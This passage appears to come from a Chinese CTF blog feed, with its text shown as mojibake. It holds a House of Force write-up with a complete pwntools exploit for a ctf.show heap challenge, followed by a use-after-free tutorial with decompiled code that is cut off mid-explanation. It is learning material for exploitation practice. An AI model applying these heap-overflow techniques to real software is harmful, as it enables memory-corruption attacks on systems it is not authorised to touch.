href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>ä¾‹é¢˜ä¸‹è½½ ï¼š<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/pwn143_1604">ä¾‹é¢˜</a></p><p>éå¸¸ç»å…¸çš„èœå•</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011728057.png"></p><p>ç›´æ¥çœ‹å…³é”®ç‚¹</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011730321.png" alt="editå‡½æ•°"></p><p>editå‡½æ•°å­˜åœ¨å †æº¢å‡ºï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªæ¼æ´æ¥æ§åˆ¶Top chunkçš„sizeå­—æ®µ</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011733131.png"></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011735542.png" alt="mainå‡½æ•°"></p><p>è¾“å…¥5æ‰§è¡Œgondbye_meessageå‡½æ•°</p><p>åˆ©ç”¨æ€è·¯ï¼š</p><ol><li>é€šè¿‡houseofforceï¼Œå°†topchunkçš„åœ°å€ç§»åˆ°è®°å½•goodbye_messagedçš„chunk0å¤„ </li><li>å†æ¬¡ç”³è¯·chunkï¼Œæˆ‘ä»¬å°±èƒ½åˆ†é…åˆ°chunk0</li><li>å°†goodbye_messageæ”¹ä¸ºåâ»”å‡½æ•°çš„åœ°å€ </li><li>è¾“â¼Š5è°ƒâ½¤v4[1],å³å¯è·å¾—flag</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><br>filename = <span class="hljs-string">&#x27;./pwn143_1604&#x27;</span><br>url = <span class="hljs-string">&#x27;pwn.challenge.ctf.show 28117&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_hostname_and_port</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)[\s:](\d*)&#x27;</span>, url)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        hostname = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>        port = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> hostname, port<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>hostname, port = extract_hostname_and_port(url)<br>debug_flag = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>        p = remote(hostname, port)<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;debug&#x27;</span>:<br>        p = process(filename)<br>        debug_flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py [remote|debug]&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    <span class="hljs-keyword">if</span> debug_flag:<br>        <span class="hljs-keyword">try</span>:<br>            gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            b * 0x000000000400AEB</span><br><span class="hljs-string">            b * 0x000000000400C65</span><br><span class="hljs-string">            b * 0x000000000400D7D</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span><br>            gdb.attach(p, gdbscript=gdbscript)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Failed to attach GDB: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br><br>elf = ELF(filename)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>() :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice:&#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice:&#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the length:&#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the name:&#x27;</span> , content)<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice:&#x27;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the index:&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the length of name:&#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the new name:&#x27;</span> , content)<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Your choice:&#x27;</span> , <span class="hljs-string">b&#x27;4&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Please enter the index:&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  <br><br>flag = <span class="hljs-number">0x0000000000400D7F</span><br>add(<span class="hljs-number">0x30</span> , <span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>edit(<span class="hljs-number">0</span> , <span class="hljs-number">0x41</span> , payload)<br>offset = -<span class="hljs-number">0x68</span><br>add(offset , <span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x10</span> , p64(flag) * <span class="hljs-number">2</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>æ¯ä¸€æ­¥å †çš„å˜æ¢</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011740856.png" alt="ä¿®æ”¹Top chunkçš„sizeå­—æ®µ"></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011741988.png" alt="æ”¹å˜Top chunkçš„åœ°å€"></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011741669.png" alt="æ§åˆ¶goodbye_messaged"></p><p>è¡¥å……ï¼šåæ¥é€šè¿‡å­¦ä¹ å‘ç°è¿™ä¸¤ä¸ªéƒ½å±äºfastbin attackï¼Œå‰è¾¹æœ‰ç‚¹æè¿°ä¸ä¸¥è°¨äº†</p>]]></content>
    
    
    <categories>
      
      <category>å †</category>
      
    </categories>
    
    
    <tags>
      
      <tag>House-of-Force</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UAFæ¼æ´</title>
    <link href="/2024/08/01/UAF%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/08/01/UAF%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯UAF"><a href="#ä»€ä¹ˆæ˜¯UAF" class="headerlink" title="ä»€ä¹ˆæ˜¯UAF"></a>ä»€ä¹ˆæ˜¯UAF</h2><p>UAFå°±æ˜¯Use After Freeï¼Œç®€å•æ¥è¯´å°±æ˜¯é‡Šæ”¾åå†æ¬¡è¢«ä½¿ç”¨ï¼Œåˆ†ä¸ºä¸€ä¸‹å‡ ç§æƒ…å†µï¼š</p><ul><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆè¢«è®¾ç½®ä¸º NULL ï¼Œ ç„¶åå†æ¬¡ä½¿ç”¨ï¼Œè‡ªç„¶ç¨‹åºä¼šå´©æºƒã€‚</li><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL ï¼Œç„¶ååœ¨å®ƒä¸‹ä¸€æ¬¡è¢«ä½¿ç”¨ä¹‹å‰ï¼Œæ²¡æœ‰ä»£ç å¯¹è¿™å—å†…å­˜å—è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆ<strong>ç¨‹åºå¾ˆæœ‰å¯èƒ½å¯ä»¥æ­£å¸¸è¿è½¬</strong>ã€‚</li><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULLï¼Œä½†æ˜¯åœ¨å®ƒä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œæœ‰ä»£ç å¯¹è¿™å—å†…å­˜è¿›è¡Œäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆå½“ç¨‹åºå†æ¬¡ä½¿ç”¨è¿™å—å†…å­˜æ—¶ï¼Œ<strong>å°±å¾ˆæœ‰å¯èƒ½ä¼šå‡ºç°å¥‡æ€ªçš„é—®é¢˜</strong></li></ul><p>ç›®å‰æˆ‘åˆšå…¥é—¨åªç¢°è§ç¬¬ä¸€ç§ï¼Œçœ‹åˆ«äººçš„åšå®¢è¯´åä¸¤ç§æ¯”è¾ƒå¸¸è§ã€‚**æˆ‘ä»¬ä¸€èˆ¬ç§°é‡Šæ”¾åæ²¡æœ‰è¢«è®¾ç½®ä¸ºNULLçš„å†…å­˜æŒ‡é’ˆä¸ºdangling pointer(æ‚¬å‚æŒ‡é’ˆ)**ã€‚</p><p>è¿™é‡Œåœ¨how2heapä¸Šæœ‰ä¸ªå®éªŒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file doesn&#x27;t demonstrate an attack, but shows the nature of glibc&#x27;s allocator.\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;glibc uses a first-fit algorithm to select a free chunk.\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;If a chunk is free and large enough, malloc will select this chunk.\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This can be exploited in a use-after-free situation.\n&quot;</span>);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Allocating 2 buffers. They can be large, don&#x27;t have to be fastbin.\n&quot;</span>);<br><span class="hljs-type">char</span>* a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x512</span>);<br><span class="hljs-type">char</span>* b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x256</span>);<br><span class="hljs-type">char</span>* c;<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(0x512): %p\n&quot;</span>, a);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;2nd malloc(0x256): %p\n&quot;</span>, b);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;we could continue mallocing here...\n&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;now let&#x27;s put a string at a that we can read later \&quot;this is A!\&quot;\n&quot;</span>);<br><span class="hljs-built_in">strcpy</span>(a, <span class="hljs-string">&quot;this is A!&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Freeing the first one...\n&quot;</span>);<br><span class="hljs-built_in">free</span>(a);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We don&#x27;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n&quot;</span>, a);<br><br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;So, let&#x27;s allocate 0x500 bytes\n&quot;</span>);<br>c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd malloc(0x500): %p\n&quot;</span>, c);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And put a different string here, \&quot;this is C!\&quot;\n&quot;</span>);<br><span class="hljs-built_in">strcpy</span>(c, <span class="hljs-string">&quot;this is C!&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;3rd allocation %p points to %s\n&quot;</span>, c, c);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;If we reuse the first allocation, it now holds the data from the third allocation.\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç¼–è¯‘ä¸€ä¸‹åšä¸€ä¸‹è¿™ä¸ªå®éªŒ</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>åšä¸€ä¸ªæœ€ç®€å•çš„UAFæ¼æ´çš„é¢˜ï¼Œåˆå­¦å †åšå‡ºæ¥å†ç®€å•çš„é¢˜éƒ½ä¼šå¾ˆæœ‰æˆå°±æ„ŸğŸ˜ƒã€‚</p><p>ä¸‹è½½åœ°å€:<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/heap/pwn141_1804">ä¾‹é¢˜</a></p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011605301.png"></p><p>ä¸€ä¸ªç»å…¸èœå•ï¼Œæ‰“å¼€å„ä¸ªåŠŸèƒ½çœ‹ä¸€ä¸‹</p><p>Add note</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">add_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+Ch] [ebp-1Ch]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [esp+10h] [ebp-18h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [esp+14h] [ebp-14h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-keyword">if</span> ( count &lt;= <span class="hljs-number">5</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !*((_DWORD *)&amp;notelist + i) )<br>      &#123;<br>        *((_DWORD *)&amp;notelist + i) = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8u</span>);<br>        <span class="hljs-keyword">if</span> ( !*((_DWORD *)&amp;notelist + i) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        **((_DWORD **)&amp;notelist + i) = print_note_content;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Note size :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8u</span>);<br>        size = atoi(buf);<br>        v0 = *((_DWORD *)&amp;notelist + i);<br>        *(_DWORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-built_in">malloc</span>(size);<br>        <span class="hljs-keyword">if</span> ( !*(_DWORD *)(*((_DWORD *)&amp;notelist + i) + <span class="hljs-number">4</span>) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, *(<span class="hljs-type">void</span> **)(*((_DWORD *)&amp;notelist + i) + <span class="hljs-number">4</span>), size);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success !&quot;</span>);<br>        ++count;<br>        <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Full!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”³è¯·å †å—çš„æ—¶å€™å…ˆç”³è¯·ä¸€ä¸ª0x8å¤§å°çš„å †å—ç®¡ç†ï¼Œç¬¬ä¸€ä¸ªå­—å‚¨å­˜äº†printå‡½æ•°çš„åœ°å€ï¼Œç¬¬äºŒä¸ªå­—å‚¨å­˜å †çš„å†…å®¹åœ°å€ï¼Œè¿™ä¸ªå †å—çš„åœ°å€å­˜åœ¨notelistä¸­ã€‚ä¸‹é¢å°±ç”³è¯·äº†å‚¨å­˜å†…å®¹çš„å †ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011615307.png" alt="ç”³è¯·å †ç»“æ„"></p><p>Delete note</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">del_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= count )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *((_DWORD *)&amp;notelist + v1) )<br>  &#123;<br>    <span class="hljs-built_in">free</span>(*(<span class="hljs-type">void</span> **)(*((_DWORD *)&amp;notelist + v1) + <span class="hljs-number">4</span>));<br>    <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)&amp;notelist + v1));<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå­˜åœ¨UAFæ¼æ´freeæ‰å †å—ï¼Œä½†æ˜¯æ²¡æœ‰æŠŠæŒ‡é’ˆèµ‹å€¼ä¸ºNULL</p><p>Print note</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">print_note</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= count )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *((_DWORD *)&amp;notelist + v1) )<br>    (**((<span class="hljs-type">void</span> (__cdecl ***)(_DWORD))&amp;notelist + v1))(*((_DWORD *)&amp;notelist + v1));<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>è°ƒç”¨æ§åˆ¶å †å—çš„æ‰“å°å‡½æ•°ï¼Œä¼ å…¥å‚æ•°ä¸ºå†…å®¹å †å—çš„åœ°å€</p><p>å­˜åœ¨åé—¨å‡½æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202408011619614.png" alt="åé—¨å‡½æ•°"></p><p>æˆ‘ä»¬ååˆ†æƒ³è°ƒç”¨è¿™ä¸ªè¯±äººä¸”å‹å¥½çš„åé—¨å‡½æ•°ï¼Œä½†æ˜¯æ€ä¹ˆè°ƒç”¨å‘¢ï¼Œè¿™æ˜¯ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬çŸ¥é“ä½¿ç”¨æ‰“å°å†…å®¹åŠŸèƒ½çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨æ‰“å°å‡½æ•°ï¼Œå¦‚æœè°ƒç”¨æ‰“å°å‡½æ•°çš„åœ°å€æ”¹ä¸ºåé—¨å‡½æ•°çš„åœ°å€é‚£å°±å¥½äº†ï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹</p><p>å¦‚æœæƒ³æ”¹å˜æ§åˆ¶å †å—çš„printåœ°å€ï¼Œæˆ‘ä»¬å°±æƒ³åŠæ³•ï¼ŒæŠŠæ§åˆ¶å †å—å˜æˆå†…å®¹å †å—ï¼Œç„¶åè¾“å…¥åé—¨å‡½æ•°åœ°å€è¦†ç›–æ‰printçš„åœ°å€ã€‚</p><p>åˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li>ç”³è¯·note0 å¤§å°ä¸º0x10(åªè¦å¤§å°å’Œæ§åˆ¶å 